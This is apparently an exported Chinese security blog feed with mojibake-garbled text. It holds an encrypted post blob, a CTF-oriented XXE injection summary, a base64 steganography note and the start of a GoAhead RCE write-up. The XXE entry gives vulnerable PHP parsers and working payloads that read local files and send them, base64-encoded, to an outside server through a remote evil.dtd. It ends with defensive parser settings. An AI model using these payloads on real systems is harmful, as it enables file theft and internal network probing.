832a6188cf1e077ae4336ab6338fef2a24f4346ad4196746305e96eca182dadbfa6c41046a6ea25e02f79e7b3c12ad60ef5bd2f4e19a4d9dc6455a36a1fcabcb0afbddbedaa1d0b2d015bacb1e7e1a678c099c004d81a8fc2869da52e96d434a8d9d0a17ec48d58771e18a54291bebc46076d29fac1e8212748047d8f099647601f26b8ea0d27370849dabd07dc0c481e5ebf8bfc4c8baf114cbf97e64a45bffdb66ef5b48047644c804c2e73289a9708bd2eb97e0e644227beafc59d10a415ed9c2ba24747b05ee8c38b5acc9666358e3c46590e39d5fdf6f539eff7ec615a5b2bece415b45a6f22ae8307c143bf41e2880b210a238bb4edd3b6e151518a7c327bafa45ac3385547190220677196a69182c105714f1c0d2a1dacca6086dfd6af368aa3a0157d765052938ab3c319b51874d391221af08e1d7cd1b9c67e459672d00466ecb17697a4d7cfa69122da9af39df0f9b7b5ebfd587521eb2a3061bab984fcf7a215332ecd5171ecbe52b1d0f94a547e8f3754f07317dad11ac825220fb3de54f2dd765d8e147ada0243868b1ba78cbb474236fff7df17c3789a2885f48ade9e373e59904a8b5b3a3cbe21d191fb4101f2d734bd6571d09fe4d1367198836ab3c5e24d0a116f5e2906bd48e9d1ff098e6ae812d85bb82ef65542093a325c940e265d512879ad015b34ee45b5374f822ec60d0748889b9d206d37b83c25844efc803d9916ff76224888dc52116ab1548e1341c3d2a7b2856d69b2eb16f008db694fe0ab899a63d3c925ded338a1a7408ecc01a7eafe06bc688b36bfe5d96e744fd9aeb2f74274a1ca8fee3ebe4206aaba650e9468c3ed73131b4d06acb05dc7d301743d2cba77b549ea676a592c22d9e612149ef11c0e23d3b70f203fe63cc9a3d3aaeb92ef9226e6d0dc4eaa3370ecfc3b76385c4446d6d5182cd97f10dfc97b67d7c2f5bbad085ec49bf213f5f86e4f2441ef5d9515520c511c686652b78ed5f9e5046b9241d4eb983bda3c318bb36d358e7f3ca04fc93f89c9a80c28700e63458a24ed851ef4abc1064720917d59d35fbd525239271ab55733560df1ac9b68a29ee8803008e0115fa0e3dd1d20be6a8f3eb977fe0cbf270eca4bfde0f399d64199006c491e0ce9071d3bfe76aa9e93548c849993633dfa1b91d958ab0fce1b7217dddcfe3b4c7a3d68d37dddc9b89c58d2f24758a1ff706100d235474db4e9db5303ed9f11c4578f8c04c06c84d830a23b9f364db5e1c2bcfa705bb85e2b58ce8408163b12b222d19f3155f11fb4b335a98862d6984f4cbb1fae5276e1eced55e4ed028d0c47c03003e3d72e1b595dc4a02dd95a124673dfe30708cfe6226bc489ccdc25241cfad6d38ee3d7114f3893bc69b381460221b16557996fed001b5e7fb16a0e895d89860a2d9926a000825e4b10bafaf958397a63f9aef3c9ebe2aa6fe0b7d9dd3498cfd6d2860593c57420aa7fedcaec0fa23fa834659f23f494e5e14ca99661ee73a6857f06103d20ef719d908abd3227d75c2592922551e944eb9ba97ed6d99939551f5400d202b30614539aab316d6e6ff8832f70ecaa37c133ce46eedd93dc8e483d860d79a53abbc8d673ce152e39c6f37e270d29415789273e47beb26f294dbfac7a2fcc4c1c06fd93acfac95c3d6b167b7e498bac34391e62c73d91e73282b144d24a4a5db4a8db2d0b8ade172627093e8dcbccfddc072ef4ceec2aeb45f372f7467d59c874c85801d13bf8cb000554a09e1a0dd02b0292760d9a26ce629ff5fbf100342273761be1db1e23b93d003ad13621f745563900a7e0bfc1ad775b5df5e478323be6b150fc7e53a84d4f4465c54c645bd17e910fc20d17e440b2c4bdb5572e7afc8045c4e22ff77d2cb5d6e740d872d46da8069c29cf13750fd5a6eb991ecc79455df6e792f5958c7c68448f0347d10f2e35e49c980313867c4560da6051d0a52201beafe05699455b75a04a803ed6958d1419a9a797501aee5d7a5e8cbdf17b63a2672a95121172d5c343135354e73811ec5f282d537341f6f01dd0f35cdcb11ca7d1467b65791c78aee31b8da07bb3e8f9d6b93eaa643f9923617b6bef1ed7643c8e69514c315b298e8fce0a1425d16a1488fb9d001c73190102028fff2b5e80dba8c8fc1c8559e268c4fb0bf73d945bba0fafc126dec64a4204550df90f4e72ef097fb3d12e413e1bd037f73c4d13fb814e8b27d58285728a5bbdde60ad760671d71b87736f7b76431db7e64f2d61e5610a65c2593a8b6a7e38c03aa93cfcc4ebbabe235707086f0f5e54860ef3e70197d1f10a90d2b8125e938da1cac199fac47b2518b49ad2896f25bfe58bbb93e05ec0429c0d5ce29702f0b89b406d16499cd514b3dff9b33ec220b25983966e3377c95833ec460931ea994e9aafab63fd5e4b492345ab57c0accd5b6610c50c0d5f36047ca9f473369b227646eea551326d58519d31df5ace96218a72d8992776e2b7b9c88994189b1c4e8ca512659f175d4220f2256b6e547a6efbd2b7d2b1bc11bb086f5b8533ddc3957ea091c0dcbb6c8bb854af3f2374a26df3b5d002fe03be58db7c6dcd4a0bab09fe7a6ab77aff1985208a7ff89f04733562bea11058e23280b68dba327a17c00bde04430ef7ce2e2b7e74b7ce7fc1f2735951b153ae39d862253e295939c81b6f2faf95d90e31363baea457efb83e4490be6027438dfd96877d393ba86fda9e2bbd2582803ddaef6ab9b4e27f0dffec26fac366371d11694a56a68b68e79bab3d38a62898e4e5d12a608a4216efa24ef871c429063d7de41062dcf1766f0edfeb1bb0e25e66ad833a31285b2782386b55595835f91af67559c651b0ca90c91f4e5978e584dbf437a3a43b5e855af1a363bc1b626f72c7d9c487746106549683d64bd2e593f7f7eb39220e54d2399dcdbb40f2334c5d646dc8027d8456b5e4f6a492d436fc1d3eda7798525dcf26e4ce15cd2bae0d78c9b9120c3df3d3b415e2c9ed6ea2236765192ee0bdae0b900fced57648c15ef666619d6707538f7a4bcfd93d8c08c39560e2c9138dd5c11fa88734b576dc52634c69ceab4c84cbf13c25d59456d9a094fe4e33820484fbd8348c1706b20c95b678cf763f140f871daecab4045a2c4b928d270fac085c18caffc896ed93075fc59a5caa1cf72b5717681d2bfe16e4f399bca723c49f093cba9b33fabcb691dd3a5e6bf319ff79dbac08f02917bec6021a75ddb94109b9e490c66863b9e789dadf04ca95413d5f48828284adc1ba5ba506666d6c57e3b8d9c51ba1d8501f4026b6db591489f9fe4ac7ebaf9e2e5111db9177532eeec3a8ddc68f8ef700fc6f42a5db9647a078d11dba41a1e2bb35307aa0f46010b2a6d4708fa4cdec2d1d321bffdd3e9c4988f823e78ef0cfaeddbb5c6c72a413f4046c4f384e322f5df28f37c1440b3dbe65f14684d</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>PHPæ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>XXEæ³¨å…¥æ€»ç»“</title>
    <url>/2019/12/XXE%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><em>XXEå³XML External Entity Injectionï¼Œç”±äºç¨‹åºåœ¨è§£æè¾“å…¥çš„XMLæ•°æ®æ—¶ï¼Œè§£æäº†æ”»å‡»è€…ä¼ªé€ çš„å¤–éƒ¨å®ä½“è€Œäº§ç”Ÿçš„ã€‚ä¾‹å¦‚PHPä¸­çš„simplexml_loadé»˜è®¤æƒ…å†µä¸‹ä¼šè§£æå¤–éƒ¨å®ä½“ï¼Œæœ‰XXEæ¼æ´çš„æ ‡å¿—æ€§å‡½æ•°ä¸ºsimplexml_load_stringï¼ˆï¼‰</em></p><p>è¿™é‡Œä¸»è¦æ˜¯è®°å½•ä¸€äº›Payload</p><a id="more"></a>

<p>å¦‚æœè¦è‡ªå·±å¤ç°çš„è¯ï¼Œå…ˆæ£€æŸ¥è‡ªå·±æ˜¯å¦å®‰è£…php-xml</p>
<p><strong>ä¸€ã€æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Normal XXE)</strong></p>
<p><strong><em>xml.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><em>payload:</em></strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE creds [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY goodies SYSTEM "php://filter/read=convert.base64-encode/resource=./index.php"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;goodies;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191218212649252.png" alt="image-20191218212649252"></p>
<p>è¿™é‡Œä¸€èˆ¬ä¼šåˆ©ç”¨phpä¼ªåè®®è¿›è¡Œç¼–ç ï¼Œé˜²æ­¢æŸäº›ç‰¹æ®Šå­—ç¬¦å¯¼è‡´æŠ¥é”™</p>
<p><strong>äºŒã€æ— å›æ˜¾è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶(Blind OOB XXE)</strong></p>
<p><strong><em>xml.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong><em>payload</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://47.103.62.94:8888/evil.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><strong><em>evil.dtd</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219111929470.png" alt="image-20191219111929470"></p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯è¯»å–çš„æ–‡ä»¶ä¸èƒ½å¤ªå¤§ï¼Œå¦åˆ™ä¼šæŠ¥é”™</p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219112205187.png" alt="image-20191219112205187"></p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨zlibå‹ç¼©æ•°æ®æµ</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=zlib.deflate/resource=index.php</span><br></pre></td></tr></table></figure>

<p><strong><em>evil.dtd</em></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=php://filter/read=zlib.deflate/resource=index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://47.103.62.94:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219194710329.png" alt="image-20191219194710329"></p>
<p><strong><em>decode.py</em></strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str=<span class="string">""</span> //è§£å¯†çš„å­—ç¬¦ä¸²</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_base64_inflate</span><span class="params">(b64string)</span>:</span></span><br><span class="line">    decode_base64 = base64.b64decode(b64string)</span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(decode_base64,<span class="number">-15</span>)</span><br><span class="line">print(decode_base64_inflate(str))</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç›´æ¥åˆ©ç”¨phpè§£å‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‹ç¼©ï¼š<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"</span>);</span><br><span class="line">è§£å‹ï¼š<span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1"</span>);</span><br></pre></td></tr></table></figure>

<p><strong>ä¸‰ä¸¶SVGæ ¼å¼XXEæ³¨å…¥</strong></p>
<p>è¿™ä¸ªå§¿åŠ¿æ˜¯Google CTF 2019çš„<a href="http://gphotos.ctfcompetition.com:1337/" target="_blank" rel="noopener">æŸé“é¢˜</a> è¿™é“é¢˜çš„<a href="https://docs.google.com/viewerng/viewer?url=https://ctrsec.io/wp-content/uploads/2019/06/Google-CTF-2019-Writeups-Web-gphotos.pptx.pdf&hl=en" target="_blank" rel="noopener">WP</a> (æ³¨æ„ç½‘ç»œ)å­¦åˆ°çš„</p>
<p><strong><em>svg.php</em></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE svg [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM "http://47.103.62.94:8080/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="28px" height="22px" viewBox="0 0 28 22" enable-background="new 0 0 28 22" xml:space="preserve"&gt;  &lt;image id="image0" width="28" height="22" x="0" y="0"href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgA"&gt;</span></span><br><span class="line"><span class="string">&lt;/svg&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$domcument = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$domcument-&gt;loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$img = simplexml_import_dom($domcument);</span><br><span class="line">$attrs = $img-&gt;attributes();</span><br><span class="line">$width = (int) $attrs-&gt;width;</span><br><span class="line">$height = (int) $attrs-&gt;height;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219192450371.png" alt="image-20191219192450371"></p>
<p>è™½ç„¶æŠ¥äº†ä¸€å¤§å †é”™ä½†æ•°æ®å·²ç»å¸¦å‡ºæ¥äº†</p>
<p>åé¢å‘ç°ç›´æ¥ç”¨ç›²æ³¨çš„payloadä¹Ÿè¡Œ</p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191220233828942.png" alt="image-20191220233828942"></p>
<p><strong><em>å››ã€å„ç§å¹³å°ä¸Šæ”¯æŒåè®®</em></strong></p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/20181120002647-e93bbf00-ec17-1.png" alt="20181120002647-e93bbf00-ec17-1"></p>
<p><strong><em>äº”ã€HTTPå†…ç½‘ä¸»æœºæ¢æµ‹</em></strong></p>
<p>å°è¯•è¯»å–ç½‘ç»œé…ç½®æ–‡ä»¶</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta-keyword">/etc/</span>network/interfaces</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/proc/</span>net/arp</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/etc/</span>hosts</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219225251465.png" alt="image-20191219225251465"></p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219225453109.png" alt="image-20191219225453109"></p>
<p><img src="/2019/12/XXEæ³¨å…¥æ€»ç»“/image-20191219231126267.png" alt="image-20191219231126267"></p>
<p>ç„¶åé€šè¿‡BurpSuitçš„æµ‹è¯•å™¨å®Œæˆä¸»æœºå’Œç«¯å£æ¢æµ‹</p>
<p><strong>å…­ã€é˜²å¾¡XXE</strong></p>
<p><strong><em>PHPï¼š</em></strong></p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">libxml_disable_entity_loader</span>(<span class="variable"><span class="literal">true</span></span>);</span></span><br></pre></td></tr></table></figure>

<p><strong><em>JAVA:</em></strong></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =<span class="module-access"><span class="module"><span class="identifier">DocumentBuilderFactory</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance()</span>;</span><br><span class="line">dbf.set<span class="constructor">ExpandEntityReferences(<span class="params">false</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="params">true</span>)</span>;</span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>,<span class="params">false</span>)</span></span><br><span class="line"></span><br><span class="line">.set<span class="constructor">Feature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,<span class="params">false</span>)</span>;</span><br></pre></td></tr></table></figure>

<p><strong><em>Pythonï¼š</em></strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(<span class="attribute">resolve_entities</span>=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>

<p><a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">XXEæ¼æ´åˆ†æ</a></p>
<p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>æ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>base64éšå†™</title>
    <url>/2019/12/base64%E9%9A%90%E5%86%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>è¿™ç§base64éšå†™ç‰¹å¾å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯ä½ ä¼šå¾—åˆ°ä¸€å¤§å †base64çš„å­—ç¬¦ä¸²ä½†å´æ— æ³•è§£ç ã€‚å†™è¿‡è¿™é¢˜å°±å¾ˆç®€å•ï¼Œä½†base64çš„åŸç†å€¼å¾—æˆ‘ä»¬å»ç ”ç©¶ä¸€ä¸‹ã€‚<a href="https://www.tr0y.wang/2017/06/14/Base64steg/index.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p><h2 id="ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²"><a href="#ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²" class="headerlink" title="ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²"></a>ç”Ÿæˆæ­£å¸¸çš„æœ‰ç­‰å·çš„base64å­—ç¬¦ä¸²</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>,<span class="string">'wb+'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        ran_str = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">13</span>))</span><br><span class="line">        base64str = base64.b64encode(ran_str)</span><br><span class="line">        fp.write(base64str + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>


<h2 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'Tr0y&#123;Base64isF4n&#125;'</span>  <span class="comment"># flag</span></span><br><span class="line">bin_str = <span class="string">''</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>, <span class="string">''</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag])</span><br><span class="line">base64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'0.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f0, open(<span class="string">'1.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f1:  <span class="comment"># '0.txt'æ˜¯æ˜æ–‡, '1.txt'ç”¨äºå­˜æ”¾éšå†™åçš„ base64</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f0.readlines():</span><br><span class="line">        rowstr = base64.b64encode(line.replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">        equalnum = rowstr.count(<span class="string">'='</span>)</span><br><span class="line">        <span class="keyword">if</span> equalnum <span class="keyword">and</span> len(bin_str):</span><br><span class="line">            offset = int(<span class="string">'0b'</span> + bin_str[:equalnum * <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            char = rowstr[len(rowstr) - equalnum - <span class="number">1</span>]</span><br><span class="line">            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])</span><br><span class="line">            bin_str = bin_str[equalnum * <span class="number">2</span>:]</span><br><span class="line">        f1.write(rowstr + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">        rowb64 = <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">        offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]) - b64chars.index(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">'='</span>)  <span class="comment"># no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])  <span class="comment"># 8 ä½ä¸€ç»„</span></span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">githubæœ‰ä¸ªå·¥å…·</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/jerrita/</span>b64steg</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¹–æ¹˜æ¯2019å¤ç°</title>
    <url>/2019/11/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>æ‰“å¼€<a href="http://183.129.189.62:13900/index.html" target="_blank" rel="noopener">é“¾æ¥</a>,æ²¡ä»€ä¹ˆä¸œè¥¿ã€‚</p><p>æŸ¥çœ‹æºç </p><p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109213839151.png" alt="image-20191109213839151"></p><p>è¿›å…¥æç¤ºçš„é¡µé¢</p><p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109214035812.png" alt="image-20191109214035812"></p><p>å‘ç°æ˜¯GoAhead/3.6.4</p><p>ç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç° GoAhead 3.6.5ä¹‹å‰çš„ç‰ˆæœ¬ï¼ˆ2.5.0 â€“ 3.6.4ï¼‰ æœ‰ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œçš„æ¼æ´</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>GoAheadåœ¨æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå°†ä¼šä»URLå‚æ•°ä¸­å–å‡ºé”®å’Œå€¼æ³¨å†Œè¿›CGIç¨‹åºçš„ç¯å¢ƒå˜é‡ï¼Œä¸”åªè¿‡æ»¤äº†REMOTE_HOSTå’ŒHTTP_AUTHORIZATIONã€‚æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç¯å¢ƒå˜é‡ï¼Œå°±æœ‰å¾ˆå¤šæ”»å‡»æ–¹å¼ã€‚æ¯”å¦‚åœ¨Linuxä¸­ï¼ŒLD_å¼€å¤´çš„ç¯å¢ƒå˜é‡å’ŒåŠ¨æ€é“¾æ¥åº“æœ‰å…³ï¼Œå¦‚LD_PRELOADä¸­æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ï¼Œå°†ä¼šè¢«è‡ªåŠ¨åŠ è½½ï¼›LD_LIBRARY_PATHæŒ‡å®šçš„è·¯å¾„ï¼Œç¨‹åºä¼šå»å…¶ä¸­å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“ã€‚</p><a id="more"></a>







